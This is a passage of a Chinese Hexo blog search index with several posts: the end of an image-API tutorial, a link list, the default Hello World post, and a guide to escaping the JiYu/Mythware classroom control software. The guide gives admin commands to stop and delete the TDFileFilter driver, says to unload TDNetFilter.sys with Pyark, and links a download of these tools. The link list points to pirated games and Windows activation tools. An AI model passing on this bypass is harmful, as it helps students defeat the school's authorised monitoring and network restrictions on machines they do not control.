class="code"><pre><span class="line">https://你的域名/1.jpg</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的域名/1.jpg</span><br></pre></td></tr></table></figure><p>按照这格式先试一下能不能打开图片，如果打不开请检查前面的步骤有没有做错</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>如果能打开，就可以用Excel批量做出图片地址了（到这里你应该能明白上面命名的重要性了）<br>到这里只要访问 http://<font color=red>你的网站地址</font>/api/xxx.php/ 比如我的：<a href="https://blog.xieweiling.top/api/pc.php/">https://blog.xieweiling.top/api/pc.php/</a> （此链接已失效）<br><a href="https://api.xieweiling.top/">点击前往我的新API接口</a></p><p>如果能够正常出现图片的话，证明你成功了&gt;v&lt;</p><h2 id="欢迎使用我的API接口"><a href="#欢迎使用我的API接口" class="headerlink" title="欢迎使用我的API接口"></a>欢迎使用我的API接口</h2><p><a href="https://xieweiling.top/blog/API/">点击前往我的API接口文档</a></p><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>软件来源于网络，转载请标明出处</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你解除极域的控制轻松上课摸鱼</title>
      <link href="/blog/2022/05/13/02/"/>
      <url>/blog/2022/05/13/02/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>每当我们上课的时候，都会遇到电脑屏幕被控制的情况，下面就教你如何解除极域的控制，轻松摸鱼</p><h1 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h1><p>一个u盘</p><p>软件：<font color=red>JiYuTrainer</font>和<font color=red>Pyark</font> (软件下载见下文)</p><h1 id="下面开始教程："><a href="#下面开始教程：" class="headerlink" title="下面开始教程："></a>下面开始教程：</h1><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>把u盘（带有上面两个软件）插入电脑。<br>这时极域可能不会让你读取u盘（如果能读取并且能把软件拷入电脑请忽略这一步）。<br>所以我们要把它TDFileFilter驱动删掉，删除方法如下：</p><p>win 7 ：打开 “开始菜单”栏搜索cmd，用管理员权限打开<br>win 10 ：直接在图1处找cmd，然后用管理员权限打开<br><img src="https://img.beiko.top/blog/2022/05/13/image-2.png" alt="图1"></p><p>然后在cmd里面输入以下代码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop TDFileFilter </span><br><span class="line">sc delete TDFileFilter </span><br></pre></td></tr></table></figure><p>出现下面图2的状态就证明成功了</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-3.png" alt="图2"><br>操作完后u盘就能读取了，然后就不用我说了吧（肯定是把两个软件拷进去啦）</p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>打开<font color=red>JiYuTrainer</font>然后极域就被控制了，这样老师就没办法控制你了。<br>但是我们的网络还是被控制住了，什么网站都打不开。<br>先别急，这时候另外一个软件就派上用场了。</p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>打开<font color=red>Pyark</font>里面的 <font color=red>.exe</font> 文件，打开后就是下面图3这个样子</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-4.png" alt="图3"></p><p>我们点击里面的驱动模块，找到里面的<font color=red>TDNetFilter.sys</font> 如下面图4所示</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-5.png" alt="图4"></p><p>右击鼠标选择卸载驱动 如下面图5所示（<font color=red>注：可能会导致关机时蓝屏</font>）</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-6.png" alt="图5"></p><p>然后就可以开始你的摸鱼之旅吧^v^!（小心被老师发现然后GG）</p><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><p><a href="https://cloud.xieweiling.top/d/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/Windows%20%E8%BD%AF%E4%BB%B6%20%F0%9F%8C%9F%F0%9F%8C%9F%F0%9F%8C%9F/%E5%B9%B2%E6%8E%89%E6%9E%81%E5%9F%9F.zip?sign=jHrS_IyTJMP4zQ2nU4puqU0Dps5kpw4mbI_kvfWMMuI=:0">点击下载</a><br>解压密码：xieweiling.top</p><h1 id="声明"><a href="#声明" class="headerlink" title="声明:"></a>声明:</h1><p>软件来源于网络,本文仅是转载和简化，如有必要您可以通过评论的方式要求删除</p><p>如使用此教程后，出现什么问题概不负责</p>]]></content>
      
      
      
        <tags>
            
            <tag> 摸鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝藏网站推荐</title>
      <link href="/blog/2022/04/10/00/"/>
      <url>/blog/2022/04/10/00/</url>
      
        <content type="html"><![CDATA[<h1 id="宝藏网站推荐"><a href="#宝藏网站推荐" class="headerlink" title="宝藏网站推荐"></a>宝藏网站推荐</h1><p>网络空间安全测绘：<a href="https://fofa.info/">https://fofa.info/</a></p><p>安卓软件大全：<a href="https://www.apkmirror.com/">https://www.apkmirror.com/</a></p><p>二次元图库：<a href="https://www.beiko.top/">https://www.beiko.top/</a></p><p>阿里云盘资源搜索社区：<a href="https://pan666.cn/">https://pan666.cn/</a></p><p>好用的内网穿透工具：<a href="https://www.natfrp.com/?page=panel&amp;module=proxies">https://www.natfrp.com/?page=panel&amp;module=proxies</a></p><p>免费域名：<a href="http://www.freenom.world/zh/index.html?lang=zh">http://www.freenom.world/zh/index.html?lang=zh</a></p><p>图片网站：<a href="https://pixabay.com/zh/">https://pixabay.com/zh/</a> &amp; <a href="https://wallhaven.cc/">https://wallhaven.cc</a></p><p>字符库：<a href="http://www.fontawesome.com.cn/">http://www.fontawesome.com.cn/</a></p><p>图床：<a href="https://sm.ms/">https://sm.ms/</a></p><p>Butterfly主题美化：<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>游戏白嫖地址：<a href="http://flysheep.ys168.com/">http://flysheep.ys168.com/</a></p><p>随机二次元老婆壁纸：<a href="https://api.xieweiling.top/">https://api.xieweiling.top/</a> </p><p>二次元老婆天堂：<a href="https://www.beiko.top/">https://www.beiko.top/</a> &amp; <a href="https://iw233.cn/">https://iw233.cn/</a></p><p>win10美化：<a href="https://zhutix.com/">https://zhutix.com/</a></p><p>刷机资源：<a href="https://kamiui.ml/">https://kamiui.ml/</a></p><p>Windows系统下载仓储站(包含激活工具): <a href="https://hellowindows.cn/">https://hellowindows.cn/</a></p><p>免费VPS：<a href="https://hax.co.id/">https://hax.co.id/</a></p><p>动漫生肉网：<a href="http://www.kisssub.org/">http://www.kisssub.org/</a></p><p>Switch游戏白嫖：<a href="https://games520.net/">https://games520.net/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/blog/2022/04/09/hello-world/"/>
      <url>/blog/2022/04/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
